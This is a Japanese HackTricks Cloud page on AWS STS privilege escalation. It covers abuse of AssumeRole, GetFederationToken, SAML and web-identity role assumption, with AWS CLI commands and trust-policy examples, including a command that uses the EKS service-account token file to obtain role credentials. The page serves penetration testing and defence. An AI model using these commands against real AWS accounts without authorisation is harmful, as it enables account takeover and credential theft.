# AWS - STS 特権昇格

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェック！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) コレクションを発見する
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** をフォローする。**
* **ハッキングテクニックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出する。**

</details>

## STS

### `sts:AssumeRole`

すべてのロールは **ロール信頼ポリシー** とともに作成されます。このポリシーは **作成されたロールを誰が引き継ぐことができるか** を示します。 **同じアカウント** からのロールが、アカウントがそれを引き継ぐことができると述べている場合、そのアカウントはそのロールにアクセスできるようになります（そして潜在的に **特権昇格** が可能です）。

たとえば、次のロール信頼ポリシーは、誰でもそれを引き継ぐことができることを示しており、したがって **任意のユーザーがそのロールに関連付けられた権限に特権昇格** できます。
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": "sts:AssumeRole"
}
]
}
```
あなたは次を実行して役割をなりすますことができます：
```bash
aws sts assume-role --role-arn $ROLE_ARN --role-session-name sessionname
```
**潜在的影響:** ロールへの特権昇格。

{% hint style="danger" %}
この場合、権限`sts:AssumeRole`が**悪用するためにロールに指定**されている必要があり、攻撃者に属するポリシーに含まれている必要はありません。\
1つの例外を除いて、**別のアカウントからロールを仮定**するには、攻撃者アカウントもロールに対して**`sts:AssumeRole`**を持っている必要があります。
{% endhint %}

### **`sts:GetFederationToken`**

この権限を持つと、任意のユーザーをなりすまして資格情報を生成することが可能です。
```bash
aws sts get-federation-token --name <username>
```
これは、他のユーザーに成りすます権限を与えることなく安全に権限を付与する方法です:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "VisualEditor0",
"Effect": "Allow",
"Action": "sts:GetFederationToken",
"Resource": "arn:aws:sts::947247140022:federated-user/${aws:username}"
}
]
}
```
### `sts:AssumeRoleWithSAML`

このロールを持つ信頼ポリシーは、**SAML経由で認証されたユーザーに、そのロールを偽装する権限を付与します。**

この権限を持つ信頼ポリシーの例は次のとおりです：
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "OneLogin",
"Effect": "Allow",
"Principal": {
"Federated": "arn:aws:iam::290594632123:saml-provider/OneLogin"
},
"Action": "sts:AssumeRoleWithSAML",
"Condition": {
"StringEquals": {
"SAML:aud": "https://signin.aws.amazon.com/saml"
}
}
}
]
}
```
役割を偽装するための資格情報を生成するには、一般的に次のようなものを使用できます：
```bash
aws sts  assume-role-with-saml --role-arn <value> --principal-arn <value>
```
しかし、**プロバイダー**は、[onelogin-aws-assume-role](https://github.com/onelogin/onelogin-python-aws-assume-role)のような**独自のツール**を使用して、これをより簡単にするかもしれません：

{% code overflow="wrap" %}
```bash
onelogin-aws-assume-role --onelogin-subdomain mettle --onelogin-app-id 283740 --aws-region eu-west-1 -z 3600
```
{% endcode %}

**潜在的影響:** ロールへの特権昇格。

### `sts:AssumeRoleWithWebIdentity`

この権限は、モバイル、Webアプリケーション、EKS...で認証されたユーザーがウェブアイデンティティプロバイダーで一連の一時的なセキュリティ資格情報を取得する権限を付与します。[詳細はこちら。](https://docs.aws.amazon.com/STS/latest/APIReference/API\_AssumeRoleWithWebIdentity.html)

たとえば、**EKSサービスアカウント**が**IAMロールをなりすます**できるようにする場合、**`/var/run/secrets/eks.amazonaws.com/serviceaccount/token`**にトークンがあり、次のような操作を行って**ロールを仮定し資格情報を取得**できます:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/<role_name> --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
# The role name can be found in the metadata of the configuration of the pod
```
{% endcode %}

### フェデレーションの悪用

{% content-ref url="../aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じて、ゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) コレクションを発見する
* **💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) をフォローする**
* **ハッキングテクニックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出する

</details>
